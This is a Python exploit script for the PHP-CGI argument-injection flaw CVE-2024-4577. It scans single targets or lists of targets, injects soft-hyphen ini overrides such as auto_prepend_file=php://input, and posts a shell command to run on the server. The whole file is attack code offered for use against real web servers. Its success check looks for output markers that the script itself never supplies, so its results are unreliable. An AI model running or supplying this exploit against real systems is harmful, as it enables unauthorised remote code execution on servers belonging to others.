#!/usr/bin/env python3
"""
enum_cgi_rce.py

Scan & exploit PHP-CGI CVE-2024-4577 RCE injection points.

Usage:
  enum_cgi_rce.py -u http://host:5000 [--cmd "id"] [--paths /cgi-bin/php-cgi,/php-cgi]
  enum_cgi_rce.py -f targets.txt --cmd "uname -a"
"""
import sys
import argparse
import requests
from urllib.parse import urljoin

# Default paths to try
DEFAULT_PATHS = ["/cgi-bin/php-cgi", "/php-cgi"]
SOFT_HYPHEN = "%AD"

def probe_path(base, path, timeout):
    url = urljoin(base, path)
    try:
        r = requests.head(url, timeout=timeout)
        return r.status_code
    except requests.RequestException:
        return None

def test_ini_override(base, path, timeout):
    url = urljoin(base, path) + f"?{SOFT_HYPHEN}d+display_errors%3D1"
    try:
        r = requests.get(url, timeout=timeout)
        return ("Parse error" in r.text) or r.status_code==200
    except requests.RequestException:
        return False

def test_rce(base, path, cmd, timeout):
    url = urljoin(base, path) + f"?{SOFT_HYPHEN}d+auto_prepend_file%3Dphp://input"
    try:
        r = requests.post(
            url,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=cmd,
            timeout=timeout
        )
        if "[START]" in r.text:
            out = r.text.split("[START]",1)[1].split("[END]",1)[0].strip()
            return True, out
    except requests.RequestException:
        pass
    return False, None

def scan_target(target, paths, cmd, timeout, verbose):
    print(f"\n=== Scanning {target} ===")
    for p in paths:
        status = probe_path(target, p, timeout)
        print(f"[HEAD ] {p:15} -> {status}")
    for p in paths:
        ok = test_ini_override(target, p, timeout)
        print(f"[INI  ] {p:15} -> {'OK' if ok else 'FAIL'}")
    for p in paths:
        vuln, output = test_rce(target, p, cmd, timeout)
        print(f"[RCE  ] {p:15} -> {'VULNERABLE' if vuln else 'no'}")
        if vuln:
            print(f"       Output: {output}")

def main():
    parser = argparse.ArgumentParser(
        description="Enumerate & exploit PHP-CGI RCE (CVE-2024-4577)"
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u","--url", help="Single target URL")
    group.add_argument("-f","--file", help="File with one URL per line")
    parser.add_argument(
        "--paths",
        help="Comma separated CGI paths",
        default=",".join(DEFAULT_PATHS)
    )
    parser.add_argument(
        "--cmd",
        help="Command to execute (default=whoami)",
        default="whoami"
    )
    parser.add_argument(
        "--timeout",
        type=float,
        help="Request timeout in seconds",
        default=5.0
    )
    parser.add_argument(
        "-v","--verbose",
        action="store_true",
        help="Verbose output"
    )

    args = parser.parse_args()
    paths = [p.strip() for p in args.paths.split(",")]

    targets = [args.url] if args.url else open(args.file).read().split()
    for tgt in targets:
        scan_target(tgt, paths, args.cmd, args.timeout, args.verbose)

if __name__=="__main__":
    main()
##
##
